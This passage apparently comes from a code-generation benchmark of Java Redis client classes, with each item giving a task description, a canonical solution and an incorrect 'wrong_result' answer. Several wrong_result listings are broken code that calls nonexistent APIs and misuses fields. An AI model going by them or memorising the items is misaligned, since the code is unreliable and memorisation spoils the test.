    "Instruction": "Task Description: Implement a reliable Redis transaction handler class that manages MULTI/EXEC transactions, WATCH/UNWATCH operations, and connection handling in a Java application using Jedis client library.\n\nClass Description: The ReliableTransaction class provides a robust wrapper around Redis transactions, offering atomic operations, watch mechanisms for optimistic locking, and proper resource management. It handles the complete transaction lifecycle including initiation, command queuing, execution, and cleanup.\n\nAttributes:\n- pipelinedResponses: Queue<Response<?>> - Stores responses for queued commands in a transaction\n- connection: Connection - The Redis connection instance\n- closeConnection: boolean - Flag indicating whether to close the connection when done\n- broken: boolean - Indicates if the connection is in a broken state\n- inWatch: boolean - Tracks WATCH status\n- inMulti: boolean - Tracks MULTI status\n- commandObjects: CommandObjects - Provides command building functionality\n\nMethods:\n- ReliableTransaction(Connection, boolean, boolean, CommandObjects) -> void - Constructor that initializes the transaction handler\n- multi() -> void - Starts a Redis MULTI transaction\n- watch(String...) -> String - Watches given keys for changes (optimistic locking)\n- unwatch() -> String - Removes all watched keys\n- appendCommand(CommandObject<T>) -> Response<T> - Adds a command to the transaction queue\n- close() -> void - Cleans up and optionally closes the connection\n- clear() -> void - Clears current transaction or watch state\n- exec() -> List<Object> - Executes all queued commands atomically\n- discard() -> String - Discards all commands in the current transaction",
    "Canonical_solution": "import redis.clients.jedis.Connection;\nimport redis.clients.jedis.JedisConnectionException;\nimport redis.clients.jedis.JedisDataException;\nimport redis.clients.jedis.JedisException;\nimport redis.clients.jedis.Protocol.Command;\nimport redis.clients.jedis.Response;\nimport redis.clients.jedis.commands.CommandObjects;\nimport redis.clients.jedis.graph.GraphCommandObjects;\nimport redis.clients.jedis.util.RedisProtocol;\n\nimport java.util.ArrayList;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Queue;\n\npublic class ReliableTransaction {\n\n    private static final String QUEUED_STR = \"QUEUED\";\n    private final Queue<Response<?>> pipelinedResponses = new LinkedList<>();\n    protected final Connection connection;\n    private final boolean closeConnection;\n    private boolean broken = false;\n    private boolean inWatch = false;\n    private boolean inMulti = false;\n    private final CommandObjects commandObjects;\n\n    public ReliableTransaction(Connection connection, boolean doMulti, boolean closeConnection, CommandObjects commandObjects) {\n        this.connection = connection;\n        this.closeConnection = closeConnection;\n        this.commandObjects = commandObjects;\n        GraphCommandObjects graphCommandObjects = new GraphCommandObjects(this.connection);\n        graphCommandObjects.setBaseCommandArgumentsCreator(protocolCommand -> commandObjects.commandArguments(protocolCommand));\n        if (doMulti) multi();\n    }\n\n    public void multi() {\n        connection.sendCommand(Command.MULTI);\n        String status = connection.getStatusCodeReply();\n        if (!\"OK\".equals(status)) {\n            throw new JedisException(\"MULTI command failed. Received response: \" + status);\n        }\n        inMulti = true;\n    }\n\n    public String watch(final String... keys) {\n        String status = connection.executeCommand(commandObjects.watch(keys));\n        inWatch = true;\n        return status;\n    }\n\n    public String unwatch() {\n        connection.sendCommand(Command.UNWATCH);\n        String status = connection.getStatusCodeReply();\n        inWatch = false;\n        return status;\n    }\n\n    protected <T> Response<T> appendCommand(CommandObject<T> commandObject) {\n        connection.sendCommand(commandObject.getArguments());\n        String status = connection.getStatusCodeReply();\n        if (!QUEUED_STR.equals(status)) {\n            throw new JedisException(status);\n        }\n        Response<T> response = new Response<>(commandObject.getBuilder());\n        pipelinedResponses.add(response);\n        return response;\n    }\n\n    public void close() {\n        try {\n            clear();\n        } finally {\n            if (closeConnection) {\n                connection.close();\n            }\n        }\n    }\n\n    public void clear() {\n        if (broken) return;\n        if (inMulti) {\n            discard();\n        } else if (inWatch) {\n            unwatch();\n        }\n    }\n\n    public List<Object> exec() {\n        if (!inMulti) throw new IllegalStateException(\"EXEC without MULTI\");\n\n        try {\n            connection.sendCommand(Command.EXEC);\n            List<Object> unformatted = connection.getObjectMultiBulkReply();\n            if (unformatted == null) {\n                pipelinedResponses.clear();\n                return null;\n            }\n\n            List<Object> formatted = new ArrayList<>(unformatted.size());\n            for (Object o : unformatted) {\n                try {\n                    Response<?> response = pipelinedResponses.poll();\n                    response.set(o);\n                    formatted.add(response.get());\n                } catch (JedisDataException e) {\n                    formatted.add(e);\n                }\n            }\n            return formatted;\n        } catch (JedisConnectionException jce) {\n            broken = true;\n            throw jce;\n        } finally {\n            inMulti = false;\n            inWatch = false;\n            pipelinedResponses.clear();\n        }\n    }\n\n    public String discard() {\n        if (!inMulti) throw new IllegalStateException(\"DISCARD without MULTI\");\n\n        try {\n            connection.sendCommand(Command.DISCARD);\n            String status = connection.getStatusCodeReply();\n            if (!\"OK\".equals(status)) {\n                throw new JedisException(\"DISCARD command failed. Received response: \" + status);\n            }\n            return status;\n        } catch (JedisConnectionException jce) {\n            broken = true;\n            throw jce;\n        } finally {\n            inMulti = false;\n            inWatch = false;\n            pipelinedResponses.clear();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import redis.clients.jedis.Connection;\nimport redis.clients.jedis.Response;\nimport java.util.Queue;\nimport java.util.List;\nimport java.util.concurrent.LinkedBlockingQueue;\n\npublic class ReliableTransaction {\n    private final Queue<Response<?>> pipelinedResponses;\n    private Connection connection;\n    private boolean closeConnection;\n    private boolean broken;\n    private boolean inWatch;\n    private boolean inMulti;\n    private CommandObjects commandObjects;\n\n    public ReliableTransaction(Connection connection, boolean closeConnection, boolean anotherBoolean, CommandObjects commandObjects) {\n        this.connection = connection;\n        this.closeConnection = closeConnection;\n        this.broken = false;\n        this.inWatch = false;\n        this.inMulti = false;\n        this.commandObjects = commandObjects;\n        this.pipelinedResponses = new LinkedBlockingQueue<>();\n    }\n\n    public void multi() {\n        if (broken || inMulti) return;\n        connection.multi();\n        inMulti = true;\n    }\n\n    public String watch(String... keys) {\n        if (broken || inWatch) return \"OK\";\n        connection.watch(keys);\n        inWatch = true;\n        return \"OK\";\n    }\n\n    public String unwatch() {\n        if (broken || !inWatch) return \"OK\";\n        connection.unwatch();\n        inWatch = false;\n        return \"OK\";\n    }\n\n    public Response<?> appendCommand(CommandObject<?> command) {\n        if (broken || inMulti) {\n            return command.execute(connection);\n        }\n        return null;\n    }\n\n    public void close() {\n        if (closeConnection) {\n            connection.close();\n        }\n        broken = true;\n        inWatch = false;\n        inMulti = false;\n        pipelinedResponses.clear();\n    }\n\n    public void clear() {\n        inWatch = false;\n        inMulti = false;\n        pipelinedResponses.clear();\n    }\n\n    public List<Object> exec() {\n        if (broken || !inMulti) return null;\n        List<Object> responses = connection.exec();\n        pipelinedResponses.clear();\n        for (Object response : responses) {\n            pipelinedResponses.add((Response<?>) response);\n        }\n        inMulti = false;\n        return responses;\n    }\n\n    public String discard() {\n        if (broken || !inMulti) return \"OK\";\n        String result = connection.discard();\n        inMulti = false;\n        return result;\n    }\n}"
  },
  {
    "Task_id": 312,
    "Instruction": "Task Description: Implement a Redis-based registry class for node registration and subscription in a distributed system, using Java with Jedis client library.\n\nClass Description: RedisRegistry is a class that provides node registration and subscription capabilities using Redis as the backend storage. It maintains connections to Redis servers, handles node registration, and manages subscription to node changes.\n\nAttributes:\n- jedisPools: ConcurrentHashMap<String, JedisPool> - A thread-safe map storing JedisPool instances for different Redis server addresses\n- clusterName: String - The name of the current cluster\n- replicate: boolean - Flag indicating whether operations should be replicated to all Redis servers\n- notifiers: ConcurrentMap<String, Notifier> - A thread-safe map storing Notifier instances for different node paths\n\nMethods:\n- RedisRegistry(AppContext appContext) - Constructor - Initializes the registry with configuration from AppContext\n  Input: appContext: AppContext - The application context containing configuration\n  Output: None\n\n- doRegister(Node node) - protected - Registers a node in Redis\n  Input: node: Node - The node to be registered\n  Output: None (throws NodeRegistryException on failure)\n\n- doSubscribe(Node node, NotifyListener listener) - protected - Subscribes to node changes\n  Input: \n    node: Node - The node that wants to subscribe\n    listener: NotifyListener - The listener to be notified of changes\n  Output: None\n\nNested Classes:\n- NotifySub extends JedisPubSub - Handles Redis pub/sub messages\n  Methods:\n    onMessage(String key, String msg) - Processes incoming messages\n      Input:\n        key: String - The channel/key of the message\n        msg: String - The message content\n      Output: None\n\n- Notifier extends Thread - Manages subscription thread\n  Methods:\n    run() - Main thread execution for subscription\n      Input: None\n      Output: None\n    shutdown() - Stops the subscription thread\n      Input: None\n      Output: None",
    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.cluster.Config;\nimport com.github.ltsopensource.core.cluster.Node;\nimport com.github.ltsopensource.core.cluster.NodeType;\nimport com.github.ltsopensource.core.commons.utils.CollectionUtils;\nimport com.github.ltsopensource.core.constant.Constants;\nimport com.github.ltsopensource.core.exception.NodeRegistryException;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport com.github.ltsopensource.core.registry.NotifyEvent;\nimport com.github.ltsopensource.core.registry.NotifyListener;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPubSub;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class RedisRegistry {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RedisRegistry.class);\n    private final Map<String, JedisPool> jedisPools = new ConcurrentHashMap<String, JedisPool>();\n    private String clusterName;\n    private boolean replicate;\n    private final ConcurrentMap<String, Notifier> notifiers = new ConcurrentHashMap<String, Notifier>();\n\n    public RedisRegistry(AppContext appContext) {\n        Config config = appContext.getConfig();\n        this.clusterName = config.getClusterName();\n\n        String address = NodeRegistryUtils.getRealRegistryAddress(config.getRegistryAddress());\n        String[] addrs = address.split(\",\");\n        for (String addr : addrs) {\n            int i = addr.indexOf(':');\n            String host = addr.substring(0, i);\n            int port = Integer.parseInt(addr.substring(i + 1));\n            this.jedisPools.put(addr, new JedisPool(new JedisPoolConfig(), host, port, Constants.DEFAULT_TIMEOUT));\n        }\n    }\n\n    protected void doRegister(Node node) {\n        String key = NodeRegistryUtils.getNodeTypePath(clusterName, node.getNodeType());\n        boolean success = false;\n        NodeRegistryException exception = null;\n        for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n            JedisPool jedisPool = entry.getValue();\n            try {\n                Jedis jedis = jedisPool.getResource();\n                try {\n                    jedis.hset(key, node.toFullString(), String.valueOf(SystemClock.now() + Constants.DEFAULT_SESSION_TIMEOUT));\n                    jedis.publish(key, Constants.REGISTER);\n                    success = true;\n                    if (!replicate) {\n                        break;\n                    }\n                } finally {\n                    jedis.close();\n                }\n            } catch (Throwable t) {\n                exception = new NodeRegistryException(\"Failed to register node to redis registry. registry: \" + entry.getKey() + \", node: \" + node + \", cause: \" + t.getMessage(), t);\n            }\n        }\n        if (exception != null && !success) {\n            throw exception;\n        }\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) {\n        List<NodeType> listenNodeTypes = node.getListenNodeTypes();\n        if (CollectionUtils.isEmpty(listenNodeTypes)) {\n            return;\n        }\n        for (NodeType listenNodeType : listenNodeTypes) {\n            String listenNodePath = NodeRegistryUtils.getNodeTypePath(clusterName, listenNodeType);\n            Notifier notifier = notifiers.get(listenNodePath);\n            if (notifier == null) {\n                Notifier newNotifier = new Notifier(listenNodePath);\n                notifiers.putIfAbsent(listenNodePath, newNotifier);\n                notifier = notifiers.get(listenNodePath);\n                if (notifier == newNotifier) {\n                    notifier.start();\n                }\n            }\n        }\n    }\n\n    private class NotifySub extends JedisPubSub {\n        private final JedisPool jedisPool;\n\n        public NotifySub(JedisPool jedisPool) {\n            this.jedisPool = jedisPool;\n        }\n\n        @Override\n        public void onMessage(String key, String msg) {\n            if (msg.equals(Constants.REGISTER) || msg.equals(Constants.UNREGISTER)) {\n                try {\n                    Jedis jedis = jedisPool.getResource();\n                    try {\n                        doNotify(jedis, key);\n                    } finally {\n                        jedis.close();\n                    }\n                } catch (Throwable t) {\n                    LOGGER.error(t.getMessage(), t);\n                }\n            }\n        }\n    }\n\n    private class Notifier extends Thread {\n        private final String listenNodePath;\n        private volatile Jedis jedis;\n        private volatile boolean running = true;\n\n        public Notifier(String listenNodePath) {\n            super.setDaemon(true);\n            super.setName(\"LTSRedisSubscribe\");\n            this.listenNodePath = listenNodePath;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (running) {\n                    for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n                        try {\n                            JedisPool jedisPool = entry.getValue();\n                            jedis = jedisPool.getResource();\n                            try {\n                                jedis.subscribe(new NotifySub(jedisPool), listenNodePath);\n                                break;\n                            } finally {\n                                jedis.close();\n                            }\n                        } catch (Throwable t) {\n                            LOGGER.warn(\"Failed to subscribe node from redis registry. registry: \" + entry.getKey(), t);\n                        }\n                    }\n                }\n            } catch (Throwable t) {\n                LOGGER.error(t.getMessage(), t);\n            }\n        }\n\n        public void shutdown() {\n            try {\n                running = false;\n                jedis.disconnect();\n            } catch (Throwable t) {\n                LOGGER.warn(t.getMessage(), t);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisRegistry {\n    private final ConcurrentHashMap<String, JedisPool> jedisPools;\n    private final String clusterName;\n    private final boolean replicate;\n    private final ConcurrentMap<String, Notifier> notifiers;\n\n    public RedisRegistry(AppContext appContext) {\n        this.jedisPools = new ConcurrentHashMap<>();\n        this.clusterName = appContext.getClusterName();\n        this.replicate = appContext.isReplicate();\n        this.notifiers = new ConcurrentHashMap<>();\n\n        List<RedisServerConfig> redisServers = appContext.getRedisServers();\n        for (RedisServerConfig server : redisServers) {\n            String key = server.getHost() + \":\" + server.getPort();\n            JedisPool pool = new JedisPool(new JedisPoolConfig(), server.getHost(), server.getPort());\n            jedisPools.put(key, pool);\n        }\n    }\n\n    protected void doRegister(Node node) throws NodeRegistryException {\n        String key = getNodeKey(node);\n        if (replicate) {\n            for (String server : jedisPools.keySet()) {\n                try (Jedis jedis = jedisPools.get(server).getResource()) {\n                    jedis.set(key, node.toString());\n                } catch (Exception e) {\n                    throw new NodeRegistryException(\"Failed to register node \" + node.getId() + \" on server \" + server, e);\n                }\n            }\n        } else {\n            String server = jedisPools.keySet().iterator().next();\n            try (Jedis jedis = jedisPools.get(server).getResource()) {\n                jedis.set(key, node.toString());\n            } catch (Exception e) {\n                throw new NodeRegistryException(\"Failed to register node \" + node.getId() + \" on server \" + server, e);\n            }\n        }\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) {\n        String channel = getChannelKey(node);\n        Notifier notifier = notifiers.get(channel);\n        if (notifier == null) {\n            notifier = new Notifier(channel);\n            notifiers.put(channel, notifier);\n            notifier.start();\n        }\n        notifier.addListener(listener);\n    }\n\n    private String getNodeKey(Node node) {\n        return \"nodes:\" + clusterName + \":\" + node.getId();\n    }\n\n    private String getChannelKey(Node node) {\n        return \"node_changes:\" + clusterName + \":\" + node.getId();\n    }\n\n    static class NotifySub extends PubSub {\n        @Override\n        public void onMessage(String key, String msg) {\n            Notifier notifier = notifiers.get(key);\n            if (notifier != null) {\n                notifier.onNotify(key, msg);\n            }\n        }\n    }\n\n    static class Notifier extends Thread {\n        private final String channel;\n        private final ConcurrentMap<String, NotifyListener> listeners = new ConcurrentHashMap<>();\n\n        public Notifier(String channel) {\n            this.channel = channel;\n        }\n\n        public void addListener(NotifyListener listener) {\n            listeners.put(listener.getId(), listener);\n        }\n\n        @Override\n        public void run() {\n            try (Jedis jedis = jedisPools.get(jedisPools.keySet().iterator().next()).getResource()) {\n                Subscription subscription = jedis.subscribe(new NotifySub(), channel);\n            } catch (Exception e) {\n                // Handle exception\n            }\n        }\n\n        public void shutdown() {\n            // Implementation to unsubscribe\n        }\n\n        public void onNotify(String key, String msg) {\n            for (NotifyListener listener : listeners.values()) {\n                listener.onNotify(key, msg);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a Redis connection manager class in Java using Lettuce client that handles connection setup, management, and cleanup.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections using Lettuce client. It provides methods to establish a connection with configurable timeout options, retrieve the active connection, and properly close the connection when no longer needed.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used to create connections\n- connection: StatefulRedisConnection<byte[], byte[]> - The active Redis connection using byte array codec\n\nMethods:\n- setupConnection(String host, int port) -> void - Initializes the Redis client and establishes a connection to the specified Redis server with a 10-second timeout configuration\n- closeConnection() -> void - Properly closes the active connection and shuts down the Redis client\n- getConnection() -> StatefulRedisConnection<byte[], byte[]> - Returns the active Redis connection instance",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport java.time.Duration;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public void setupConnection(String host, int port) {\n        redisClient = RedisClient.create(RedisURI.create(host, port));\n        redisClient.setOptions(ClientOptions.builder()\n                .timeoutOptions(TimeoutOptions.builder().fixedTimeout(Duration.ofSeconds(10)).build()).build());\n        connection = redisClient.connect(ByteArrayCodec.INSTANCE);\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown(0, 0, TimeUnit.SECONDS);\n        }\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionManager {\n    private final RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public RedisConnectionManager() {\n        this.redisClient = null;\n        this.connection = null;\n    }\n\n    public void setupConnection(String host, int port) {\n        this.redisClient = RedisClient.builder()\n                .timeout(Duration.ofSeconds(10))\n                .build();\n        this.connection = redisClient.connect();\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n}"
  },
  {
    "Task_id": 314,
    "Instruction": "Task Description: Implement a Redis cluster connection provider in Java that manages connections to a Redis cluster, handles slot-based routing, and provides connection pooling functionality.\n\nClass Description: ClusterConnectionProvider is a connection management class for Redis clusters that maintains a cache of cluster nodes and slots, provides connections based on slot hashing, and handles connection failures with retry logic.\n\nAttributes:\n- cache: JedisClusterInfoCache - Maintains information about cluster nodes, slots, and connection pools\n\nMethods:\n- initializeSlotsCache(Set<HostAndPort>, JedisClientConfig) -> void - Initializes the cluster slots cache by connecting to seed nodes and discovering cluster topology\n- getConnection(CommandArguments) -> Connection - Retrieves a connection based on command arguments (slot-aware)\n- getConnection() -> Connection - Gets a random connection from available cluster nodes\n- getConnectionFromSlot(int) -> Connection - Gets a connection specifically for a given hash slot\n- renewSlotCache() -> void - Refreshes the cluster slots information\n- close() -> void - Closes all connections and releases resources\n- getConnectionMap() -> Map<String, ConnectionPool> - Returns an unmodifiable map of all node connections",
    "Canonical_solution": "import java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Set;\nimport java.util.concurrent.ThreadLocalRandom;\n\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\nimport redis.clients.jedis.ClusterCommandArguments;\nimport redis.clients.jedis.CommandArguments;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.JedisClusterInfoCache;\nimport redis.clients.jedis.exceptions.JedisClusterOperationException;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class ClusterConnectionProvider implements ConnectionProvider {\n\n  protected final JedisClusterInfoCache cache;\n\n  public ClusterConnectionProvider(Set<HostAndPort> clusterNodes, JedisClientConfig clientConfig) {\n    this.cache = new JedisClusterInfoCache(clientConfig, clusterNodes);\n    initializeSlotsCache(clusterNodes, clientConfig);\n  }\n\n  private void initializeSlotsCache(Set<HostAndPort> startNodes, JedisClientConfig clientConfig) {\n    if (startNodes.isEmpty()) {\n      throw new JedisClusterOperationException(\"No nodes to initialize cluster slots cache.\");\n    }\n\n    ArrayList<HostAndPort> startNodeList = new ArrayList<>(startNodes);\n    Collections.shuffle(startNodeList);\n\n    JedisException firstException = null;\n    for (HostAndPort hostAndPort : startNodeList) {\n      try (Connection jedis = new Connection(hostAndPort, clientConfig)) {\n        cache.discoverClusterNodesAndSlots(jedis);\n        return;\n      } catch (JedisException e) {\n        if (firstException == null) {\n          firstException = e;\n        }\n      }\n    }\n\n    JedisClusterOperationException uninitializedException\n        = new JedisClusterOperationException(\"Could not initialize cluster slots cache.\");\n    uninitializedException.addSuppressed(firstException);\n    throw uninitializedException;\n  }\n\n  @Override\n  public Connection getConnection(CommandArguments args) {\n    final int slot = ((ClusterCommandArguments) args).getCommandHashSlot();\n    return slot >= 0 ? getConnectionFromSlot(slot) : getConnection();\n  }\n\n  @Override\n  public Connection getConnection() {\n    List<ConnectionPool> pools = cache.getShuffledNodesPool();\n\n    JedisException suppressed = null;\n    for (ConnectionPool pool : pools) {\n      Connection jedis = null;\n      try {\n        jedis = pool.getResource();\n        if (jedis == null) {\n          continue;\n        }\n\n        jedis.ping();\n        return jedis;\n\n      } catch (JedisException ex) {\n        if (suppressed == null) {\n          suppressed = ex;\n        }\n        if (jedis != null) {\n          jedis.close();\n        }\n      }\n    }\n\n    JedisClusterOperationException noReachableNode = new JedisClusterOperationException(\"No reachable node in cluster.\");\n    if (suppressed != null) {\n      noReachableNode.addSuppressed(suppressed);\n    }\n    throw noReachableNode;\n  }\n\n  public Connection getConnectionFromSlot(int slot) {\n    ConnectionPool connectionPool = cache.getSlotPool(slot);\n    if (connectionPool != null) {\n      return connectionPool.getResource();\n    } else {\n      renewSlotCache();\n      connectionPool = cache.getSlotPool(slot);\n      if (connectionPool != null) {\n        return connectionPool.getResource();\n      } else {\n        return getConnection();\n      }\n    }\n  }\n\n  public void renewSlotCache() {\n    cache.renewClusterSlots(null);\n  }\n\n  @Override\n  public void close() {\n    cache.close();\n  }\n\n  @Override\n  public Map<String, ConnectionPool> getConnectionMap() {\n    return Collections.unmodifiableMap(cache.getNodes());\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import java.util.*;\nimport java.util.concurrent.Random;\n\npublic class ClusterConnectionProvider {\n    private final JedisClusterInfoCache cache;\n    private final Map<String, ConnectionPool> nodePools;\n\n    public ClusterConnectionProvider(JedisClusterInfoCache cache) {\n        this.cache = cache;\n        this.nodePools = new HashMap<>();\n    }\n\n    public void initializeSlotsCache(Set<HostAndPort> seedNodes, JedisClientConfig config) {\n        cache.initialize(seedNodes, config);\n        nodePools.clear();\n        for (HostAndPort node : cache.getNodes()) {\n            String key = node.getHost() + \":\" + node.getPort();\n            nodePools.put(key, createConnectionPool(config));\n        }\n    }\n\n    private ConnectionPool createConnectionPool(JedisClientConfig config) {\n        return new JedisPool(config);\n    }\n\n    public Connection getConnection(CommandArguments args) {\n        if (args.hasSlot()) {\n            return getConnectionFromSlot(args.getSlot());\n        } else {\n            return getConnection();\n        }\n    }\n\n    public Connection getConnection() {\n        if (nodePools.isEmpty()) {\n            throw new IllegalStateException(\"No available nodes\");\n        }\n        String nodeKey = getRandomNodeKey();\n        return nodePools.get(nodeKey).getConnection();\n    }\n\n    public Connection getConnectionFromSlot(int slot) {\n        HostAndPort node = cache.getNodeForSlot(slot);\n        String key = node.getHost() + \":\" + node.getPort();\n        return nodePools.get(key).getConnection();\n    }\n\n    public void renewSlotCache() {\n        cache.renewSlots();\n        nodePools.clear();\n        for (HostAndPort node : cache.getNodes()) {\n            String key = node.getHost() + \":\" + node.getPort();\n            nodePools.put(key, createConnectionPool(cache.getClientConfig()));\n        }\n    }\n\n    public void close() {\n        for (ConnectionPool pool : nodePools.values()) {\n            pool.close();\n        }\n    }\n\n    public Map<String, ConnectionPool> getConnectionMap() {\n        return Collections.unmodifiableMap(nodePools);\n    }\n\n    private String getRandomNodeKey() {\n        List<String> keys = new ArrayList<>(nodePools.keySet());\n        return keys.get(new Random().nextInt(keys.size()));\n    }\n}"
  },
  {
    "Task_id": 315,
    "Instruction": "Task Description: Implement a Redis connection class in Java that handles socket communication, authentication, and basic Redis operations while managing connection state and resources.\n\nClass Description: The Connection class represents a Redis client connection that manages socket communication with a Redis server. It handles connection establishment, command sending, response reading, and connection cleanup. The class implements Closeable for proper resource management.\n\nAttributes:\n- socketFactory: JedisSocketFactory - Factory for creating socket connections to Redis\n- socket: Socket - The underlying socket connection to Redis\n- outputStream: RedisOutputStream - Output stream for sending commands to Redis\n- inputStream: RedisInputStream - Input stream for reading responses from Redis\n- soTimeout: int - Socket timeout setting\n- broken: boolean - Flag indicating if the connection is in a broken state\n- currentCredentials: AtomicReference<RedisCredentials> - Current authentication credentials\n- authXManager: AuthXManager - Manager for authentication operations\n\nMethods:\n- Connection(JedisSocketFactory) -> void - Constructor that initializes with a socket factory\n- connect() -> void - Establishes connection to Redis server\n- disconnect() -> void - Closes the connection to Redis server\n- isConnected() -> boolean - Checks if connection is active\n- isBroken() -> boolean - Checks if connection is in broken state\n- setBroken() -> void - Marks connection as broken\n- sendCommand(ProtocolCommand, byte[]...) -> void - Sends a Redis command with arguments\n- getOne() -> Object - Reads and returns a single response from Redis\n- flush() -> void - Flushes the output stream\n- readProtocolWithCheckingBroken() -> Object - Reads protocol response while checking connection state\n- close() -> void - Implements Closeable interface to disconnect (alias for disconnect)",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Arrays;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.Protocol.Command;\nimport redis.clients.jedis.Protocol.Keyword;\nimport redis.clients.jedis.args.Rawable;\nimport redis.clients.jedis.authentication.AuthXManager;\nimport redis.clients.jedis.commands.ProtocolCommand;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisDataException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.IOUtils;\nimport redis.clients.jedis.util.RedisInputStream;\nimport redis.clients.jedis.util.RedisOutputStream;\n\npublic class Connection implements Closeable {\n\n  private final JedisSocketFactory socketFactory;\n  private Socket socket;\n  private RedisOutputStream outputStream;\n  private RedisInputStream inputStream;\n  private int soTimeout = 0;\n  private boolean broken = false;\n  private AtomicReference<RedisCredentials> currentCredentials = new AtomicReference<>(null);\n  private AuthXManager authXManager;\n\n  public Connection(final JedisSocketFactory socketFactory) {\n    this.socketFactory = socketFactory;\n  }\n\n  public void connect() throws JedisConnectionException {\n    if (!isConnected()) {\n      try {\n        socket = socketFactory.createSocket();\n        outputStream = new RedisOutputStream(socket.getOutputStream());\n        inputStream = new RedisInputStream(socket.getInputStream());\n        broken = false;\n      } catch (JedisConnectionException jce) {\n        setBroken();\n        throw jce;\n      } catch (IOException ioe) {\n        setBroken();\n        throw new JedisConnectionException(\"Failed to create input/output stream\", ioe);\n      } finally {\n        if (broken) {\n          IOUtils.closeQuietly(socket);\n        }\n      }\n    }\n  }\n\n  public void disconnect() {\n    if (isConnected()) {\n      try {\n        outputStream.flush();\n        socket.close();\n      } catch (IOException ex) {\n        throw new JedisConnectionException(ex);\n      } finally {\n        IOUtils.closeQuietly(socket);\n        setBroken();\n      }\n    }\n  }\n\n  public boolean isConnected() {\n    return socket != null && socket.isBound() && !socket.isClosed() && socket.isConnected()\n        && !socket.isInputShutdown() && !socket.isOutputShutdown();\n  }\n\n  public boolean isBroken() {\n    return broken;\n  }\n\n  public void setBroken() {\n    broken = true;\n  }\n\n  public void sendCommand(final ProtocolCommand cmd, final byte[]... args) {\n    try {\n      connect();\n      Protocol.sendCommand(outputStream, new CommandArguments(cmd).addObjects((Object[]) args));\n    } catch (JedisConnectionException ex) {\n      setBroken();\n      throw ex;\n    }\n  }\n\n  public Object getOne() {\n    flush();\n    return readProtocolWithCheckingBroken();\n  }\n\n  protected void flush() {\n    try {\n      outputStream.flush();\n    } catch (IOException ex) {\n      setBroken();\n      throw new JedisConnectionException(ex);\n    }\n  }\n\n  protected Object readProtocolWithCheckingBroken() {\n    if (broken) {\n      throw new JedisConnectionException(\"Attempting to read from a broken connection.\");\n    }\n    try {\n      return Protocol.read(inputStream);\n    } catch (JedisConnectionException exc) {\n      broken = true;\n      throw exc;\n    }\n  }\n\n  @Override\n  public void close() {\n    disconnect();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class Connection implements Closeable {\n    private final JedisSocketFactory socketFactory;\n    private Socket socket;\n    private RedisOutputStream outputStream;\n    private RedisInputStream inputStream;\n    private int soTimeout;\n    private boolean broken;\n    private AtomicReference<RedisCredentials> currentCredentials;\n    private AuthXManager authXManager;\n\n    public Connection(JedisSocketFactory socketFactory) {\n        this.socketFactory = socketFactory;\n        this.currentCredentials = new AtomicReference<>();\n        this.authXManager = new AuthXManager();\n    }\n\n    public void connect() {\n        try {\n            socket = socketFactory.createSocket();\n            socket.setSoTimeout(soTimeout);\n            outputStream = new RedisOutputStream(socket.getOutputStream());\n            inputStream = new RedisInputStream(socket.getInputStream());\n        } catch (IOException e) {\n            setBroken();\n        }\n    }\n\n    public void disconnect() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public boolean isConnected() {\n        return socket != null && !broken && socket.isConnected();\n    